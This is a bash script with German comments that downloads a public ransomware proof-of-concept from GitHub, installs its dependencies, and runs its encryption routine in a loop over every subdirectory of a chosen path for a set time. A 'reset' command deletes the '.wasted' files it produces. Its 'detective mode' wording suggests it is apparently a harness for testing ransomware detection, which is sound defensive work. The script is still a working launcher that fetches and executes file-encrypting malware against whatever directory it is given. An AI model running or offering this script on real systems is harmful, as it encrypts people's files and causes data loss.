#!/bin/bash

# --- KONFIGURATION ---
PROJECT_NAME="JimmyRansomware"
INSTALL_DIR="$(pwd)/$PROJECT_NAME"
VENV_DIR="$INSTALL_DIR/venv"
REPO_URL="https://github.com/jimmy-ly00/Ransomware-PoC"
REAL_USER=${SUDO_USER:-$USER}

# -----------------------------------------------------------------
# DER TERMINATOR (Cleanup) 
# -----------------------------------------------------------------
cleanup() {
    trap - SIGINT SIGTERM EXIT
    echo -e "\n\033[0;31m🚨 NOT-AUS: Stoppe alle Prozesse...\033[0m"
    jobs -p | xargs -r kill -9 2>/dev/null
    sudo -u "$REAL_USER" pkill -9 -f "main.py" 2>/dev/null
    pkill -9 -f "main.py" 2>/dev/null
    pkill -9 -P $$ 2>/dev/null
    kill -9 -$$ 2>/dev/null
    exit 130
}
trap cleanup SIGINT SIGTERM EXIT

# -----------------------------------------------------------------
# 1. SETUP-FUNKTION (Wieder eingebaut!)
# -----------------------------------------------------------------
do_setup() {
    echo -e "\033[0;32m[+] Starte Setup im Projektordner...\033[0m"
    sudo apt-get update -q && sudo apt-get install -y python3-venv git python3-pip -q

    if [ -d "$INSTALL_DIR" ]; then
        sudo chown -R "$REAL_USER:$REAL_USER" "$INSTALL_DIR"
    fi

    sudo -u "$REAL_USER" bash -c "
        if [ ! -d '$INSTALL_DIR' ]; then
            git clone '$REPO_URL' '$INSTALL_DIR' --quiet
        fi
        cd '$INSTALL_DIR'
        if [ ! -d 'venv' ]; then
            echo '[+] Erstelle venv...'
            python3 -m venv venv
        fi
        ./venv/bin/pip install --upgrade pip --quiet
        ./venv/bin/pip install pycryptodome --quiet
    "
    echo -e "\033[0;32m[OK] Setup fertig. Die venv liegt in $VENV_DIR\033[0m"
}

# -----------------------------------------------------------------
# 2. RUN-FUNKTION (Mit Fehler-Analyse)
# -----------------------------------------------------------------
do_run() {
    TARGET=$1
    DURATION=$2

    if [[ -z "$TARGET" || -z "$DURATION" ]]; then
        echo "Benutzung: ./run_jimmy_ransomware.sh run [Pfad] [Sekunden]"; exit 1
    fi

    if [ ! -d "$VENV_DIR" ]; then
        echo -e "\033[0;31m[FEHLER] venv nicht gefunden. Bitte führe zuerst 'setup' aus!\033[0m"
        exit 1
    fi

    mapfile -t SUBDIRS < <(find "$TARGET" -type d 2>/dev/null)
    echo -e "\033[0;32m=== DETECTIVE MODE GESTARTET (Dauer: ${DURATION}s) ===\033[0m"

    END_TIME=$((SECONDS + DURATION))

    while [ $SECONDS -lt $END_TIME ]; do
        for SUBDIR in "${SUBDIRS[@]}"; do
            if [ $SECONDS -ge $END_TIME ]; then break 2; fi

            echo -n -e "\033[0;34m[TEST]\033[0m Greife an: $SUBDIR ... "
            
            # Führe Python aus und fange ALLE Ausgaben (Fehler & Normal) ab
            ERROR_LOG=$(sudo -u "$REAL_USER" "$VENV_DIR/bin/python3" "$INSTALL_DIR/main.py" -p "$SUBDIR" -e 2>&1)
            EXIT_STATUS=$?

            if [ $EXIT_STATUS -eq 0 ]; then
                echo -e "\033[0;32m[ERFOLG]\033[0m"
            else
                echo -e "\033[0;31m[FEHLGESCHLAGEN (Code: $EXIT_STATUS)]\033[0m"
                echo -e "\033[0;33m--- PYTHON FEHLERMELDUNG ---\033[0m"
                echo "$ERROR_LOG"
                echo -e "\033[0;33m----------------------------\033[0m"
            fi
        done
        sleep 0.5
    done
}

# -----------------------------------------------------------------
# AUSWAHLMENÜ
# -----------------------------------------------------------------
case "$1" in
    setup) do_setup ;;
    run)   do_run "$2" "$3" ;;
    reset) find "$2" -name "*.wasted" -type f -delete 2>/dev/null ;;
    *)     echo "Befehle: setup | run | reset" ;;
esac